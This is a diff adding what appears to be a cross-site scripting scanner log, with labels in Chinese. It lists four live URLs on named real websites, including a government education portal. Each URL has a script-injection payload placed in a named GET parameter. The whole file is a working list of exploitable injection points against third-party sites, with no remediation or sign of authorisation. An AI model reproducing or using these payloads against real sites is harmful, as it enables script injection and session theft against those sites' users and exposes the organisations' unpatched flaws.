@@ -1,0 +1,20 @@
+检测网址 : http://gzedu.gov.cn/portal/legal/theme?region=</script>"><script>prompt(1)</script>440100&catalogCode=002001003
+提交方式 : GET
+漏洞参数 : region
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://service.5399.com/reset/step1.html?type=</script>"><script>prompt(1)</script>4
+提交方式 : GET
+漏洞参数 : type
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://edong.com/exclusive_list.php?cls_id=</script>"><script>prompt(1)</script>1&c_line=1
+提交方式 : GET
+漏洞参数 : cls_id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://finance.szhtxx.cn:7002/WeiXin/check/viewReceipt.jsp?cust_tax_code=</script>"><script>prompt(1)</script>null
+提交方式 : GET
+漏洞参数 : cust_tax_code
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
